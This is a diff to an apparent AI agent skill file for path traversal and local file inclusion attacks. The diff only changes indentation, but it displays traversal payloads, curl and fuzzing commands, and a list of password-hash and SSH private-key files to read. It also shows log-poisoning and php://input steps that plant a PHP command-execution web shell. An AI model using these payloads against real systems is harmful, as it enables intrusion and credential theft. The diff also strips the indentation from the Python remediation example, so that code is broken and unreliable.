@@ -2,8 +2,8 @@
 name: File Path Traversal Testing
 description: This skill should be used when the user asks to "test for directory traversal", "exploit path traversal vulnerabilities", "read arbitrary files through web applications", "find LFI vulnerabilities", or "access files outside web root". It provides comprehensive file path traversal attack and testing methodologies.
 metadata:
-  author: zebbern
-  version: "1.1"
+ author: zebbern
+ version: "1.1"
 ---
 
 # File Path Traversal Testing
@@ -44,7 +44,7 @@ Path traversal occurs when applications use user input to construct file paths:
 // Vulnerable PHP code example
 $template = "blue.php";
 if (isset($_COOKIE['template']) && !empty($_COOKIE['template'])) {
-    $template = $_COOKIE['template'];
+ $template = $_COOKIE['template'];
 }
 include("/home/user/templates/" . $template);
 ```
@@ -110,7 +110,7 @@ Common vulnerable functionality:
 
 # URL encoded
 ..%2F..%2F..%2Fetc%2Fpasswd
-..%252F..%252F..%252Fetc%252Fpasswd  # Double encoding
+..%252F..%252F..%252Fetc%252Fpasswd # Double encoding
 
 # Test payloads with curl
 curl "http://target.com/image?filename=../../../etc/passwd"
@@ -201,18 +201,18 @@ High-value files to target:
 
 ```bash
 # System files
-/etc/passwd           # User accounts
-/etc/shadow           # Password hashes (root only)
-/etc/group            # Group information
-/etc/hosts            # Host mappings
-/etc/hostname         # System hostname
-/etc/issue            # System banner
+/etc/passwd # User accounts
+/etc/shadow # Password hashes (root only)
+/etc/group # Group information
+/etc/hosts # Host mappings
+/etc/hostname # System hostname
+/etc/issue # System banner
 
 # SSH files
-/root/.ssh/id_rsa           # Root private key
-/root/.ssh/authorized_keys  # Authorized keys
-/home/<user>/.ssh/id_rsa    # User private keys
-/etc/ssh/sshd_config        # SSH configuration
+/root/.ssh/id_rsa # Root private key
+/root/.ssh/authorized_keys # Authorized keys
+/home/<user>/.ssh/id_rsa # User private keys
+/etc/ssh/sshd_config # SSH configuration
 
 # Web server files
 /etc/apache2/apache2.conf
@@ -229,10 +229,10 @@ High-value files to target:
 /var/www/html/web.config
 
 # Process information
-/proc/self/environ      # Environment variables
-/proc/self/cmdline      # Process command line
-/proc/self/fd/0         # File descriptors
-/proc/version           # Kernel version
+/proc/self/environ # Environment variables
+/proc/self/cmdline # Process command line
+/proc/self/fd/0 # File descriptors
+/proc/version # Kernel version
 
 # Common application configs
 /etc/mysql/my.cnf
@@ -287,13 +287,13 @@ C:\Documents and Settings\<user>\
 ```bash
 # Basic traversal fuzzing
 ffuf -u "http://target.com/image?filename=FUZZ" \
-     -w /usr/share/wordlists/traversal.txt \
-     -mc 200
+ -w /usr/share/wordlists/traversal.txt \
+ -mc 200
 
 # Fuzzing with encoding
 ffuf -u "http://target.com/page?file=FUZZ" \
-     -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
-     -mc 200,500 -ac
+ -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
+ -mc 200,500 -ac
 ```
 
 #### Using wfuzz
@@ -301,13 +301,13 @@ ffuf -u "http://target.com/page?file=FUZZ" \
 ```bash
 # Traverse to /etc/passwd
 wfuzz -c -z file,/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
-      --hc 404 \
-      "http://target.com/index.php?file=FUZZ"
+ --hc 404 \
+ "http://target.com/index.php?file=FUZZ"
 
 # With headers/cookies
 wfuzz -c -z file,traversal.txt \
-      -H "Cookie: session=abc123" \
-      "http://target.com/load?path=FUZZ"
+ -H "Cookie: session=abc123" \
+ "http://target.com/load?path=FUZZ"
 ```
 
 ### Phase 8: LFI to RCE Escalation
@@ -331,11 +331,11 @@ curl "http://target.com/page?file=../../../var/log/auth.log&cmd=whoami"
 ```bash
 # Inject via User-Agent
 curl -A "<?php system('id'); ?>" \
-     "http://target.com/page?file=/proc/self/environ"
+ "http://target.com/page?file=/proc/self/environ"
 
 # With command parameter
 curl -A "<?php system(\$_GET['c']); ?>" \
-     "http://target.com/page?file=/proc/self/environ&c=whoami"
+ "http://target.com/page?file=/proc/self/environ&c=whoami"
 ```
 
 #### PHP Wrapper Exploitation
@@ -346,7 +346,7 @@ curl "http://target.com/page?file=php://filter/convert.base64-encode/resource=co
 
 # php://input - Execute POST data as PHP
 curl -X POST -d "<?php system('id'); ?>" \
-     "http://target.com/page?file=php://input"
+ "http://target.com/page?file=php://input"
 
 # data:// - Execute inline PHP
 curl "http://target.com/page?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==&c=id"
@@ -398,7 +398,7 @@ $path = "/var/www/files/" . $filename;
 // PHP: Validate against whitelist
 $allowed = ['report.pdf', 'manual.pdf', 'guide.pdf'];
 if (in_array($_GET['file'], $allowed)) {
-    include("/var/www/files/" . $_GET['file']);
+ include("/var/www/files/" . $_GET['file']);
 }
 
 // PHP: Canonicalize and verify base path
@@ -408,7 +408,7 @@ $userPath = $base . $_GET['file'];
 $realUserPath = realpath($userPath);
 
 if ($realUserPath && strpos($realUserPath, $realBase) === 0) {
-    include($realUserPath);
+ include($realUserPath);
 }
 ```
 
@@ -417,15 +417,15 @@ if ($realUserPath && strpos($realUserPath, $realBase) === 0) {
 import os
 
 def safe_file_access(base_dir, filename):
-    # Resolve to absolute path
-    base = os.path.realpath(base_dir)
-    file_path = os.path.realpath(os.path.join(base, filename))
-    
-    # Verify file is within base directory
-    if file_path.startswith(base):
-        return open(file_path, 'r').read()
-    else:
-        raise Exception("Access denied")
+ # Resolve to absolute path
+ base = os.path.realpath(base_dir)
+ file_path = os.path.realpath(os.path.join(base, filename))
+ 
+ # Verify file is within base directory
+ if file_path.startswith(base):
+ return open(file_path, 'r').read()
+ else:
+ raise Exception("Access denied")
 ```
 
 ## Quick Reference
